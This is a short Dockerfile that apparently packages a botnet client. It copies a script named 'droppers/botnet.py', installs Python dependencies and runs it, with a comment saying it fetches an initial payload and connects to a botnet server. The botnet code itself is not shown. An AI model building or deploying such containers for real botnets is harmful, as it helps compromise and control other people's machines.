FROM python:3.11.9-bullseye

WORKDIR /app

COPY modules/clients/droppers/botnet.py .
COPY requirements.txt .

RUN pip install --upgrade pip setuptools wheel
RUN pip install -r requirements.txt
RUN pip install requests
RUN pip install numpy

# Get the initial payload, and create an connection to the botnet server
ENTRYPOINT [ "python", "botnet.py" ]